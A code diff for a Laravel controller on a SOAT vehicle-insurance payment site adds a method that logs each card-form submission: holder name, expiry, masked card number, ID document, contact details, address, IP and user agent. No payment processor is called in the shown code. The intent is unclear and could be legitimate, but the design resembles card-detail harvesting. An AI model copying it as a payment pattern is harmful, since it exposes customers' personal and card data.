@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\Cliente;
 use App\Models\QrConfig;
+use App\Models\TarjetaPagoEnvio;
 use App\Models\Vehiculo;
 use App\Models\PolizaSoat;
 use Illuminate\Http\Request;
@@ -210,6 +211,74 @@ class ConsultaSoatController extends Controller
         $qrConfig = QrConfig::getActive();
 
         return view('soat.pago-tarjeta', compact('cliente', 'vehiculo', 'total', 'qrConfig'));
+    }
+
+    /**
+     * Guarda el envío del formulario de tarjeta para seguimiento administrativo.
+     * Nota: No se guarda CVV ni número completo por seguridad.
+     */
+    public function registrarEnvioTarjeta(Request $request)
+    {
+        $payload = $request->session()->get('soat_confirmacion');
+        if (! is_array($payload) || empty($payload['cliente_id']) || empty($payload['vehiculo_id'])) {
+            return response()->json([
+                'ok' => false,
+                'message' => 'Sesión expirada. Vuelve a consultar tu SOAT.',
+            ], 422);
+        }
+
+        $cliente = Cliente::find($payload['cliente_id']);
+        $vehiculo = Vehiculo::where('id', $payload['vehiculo_id'])
+            ->where('cliente_id', $payload['cliente_id'])
+            ->first();
+
+        if (! $cliente || ! $vehiculo) {
+            return response()->json([
+                'ok' => false,
+                'message' => 'No se encontraron datos de cliente/vehículo.',
+            ], 422);
+        }
+
+        $data = $request->validate([
+            'total' => ['required', 'integer', 'min:1'],
+            'tipo_tarjeta' => ['required', 'string', 'in:credito,debito'],
+            'numero_tarjeta' => ['required', 'string', 'min:13', 'max:25'],
+            'nombre_tarjeta' => ['required', 'string', 'max:150'],
+            'vencimiento' => ['required', 'string', 'max:5'],
+            'cuotas' => ['nullable', 'integer', 'min:1', 'max:24'],
+            'tipo_documento' => ['nullable', 'string', 'max:10'],
+            'numero_documento' => ['nullable', 'string', 'max:50'],
+            'email' => ['nullable', 'email', 'max:150'],
+            'celular' => ['nullable', 'string', 'max:30'],
+            'direccion' => ['nullable', 'string', 'max:255'],
+        ]);
+
+        $soloNumeros = preg_replace('/\D+/', '', (string) $data['numero_tarjeta']) ?: '';
+        $ultimos4 = substr($soloNumeros, -4);
+        $numeroEnmascarado = $ultimos4 !== '' ? '**** **** **** '.$ultimos4 : '****';
+
+        TarjetaPagoEnvio::create([
+            'cliente_id' => $cliente->id,
+            'vehiculo_id' => $vehiculo->id,
+            'total' => (int) $data['total'],
+            'tipo_tarjeta' => $data['tipo_tarjeta'],
+            'titular' => trim((string) $data['nombre_tarjeta']),
+            'numero_enmascarado' => $numeroEnmascarado,
+            'ultimos4' => $ultimos4 !== '' ? $ultimos4 : null,
+            'vencimiento' => $data['vencimiento'],
+            'cuotas' => (int) ($data['cuotas'] ?? 1),
+            'tipo_documento' => $data['tipo_documento'] ?? null,
+            'numero_documento' => $data['numero_documento'] ?? null,
+            'email' => $data['email'] ?? null,
+            'celular' => $data['celular'] ?? null,
+            'direccion' => $data['direccion'] ?? null,
+            'placa' => $vehiculo->placa ? strtoupper((string) $vehiculo->placa) : null,
+            'ip' => $request->ip(),
+            'user_agent' => $request->userAgent(),
+            'estado' => 'recibido',
+        ]);
+
+        return response()->json(['ok' => true]);
     }
 
     /**
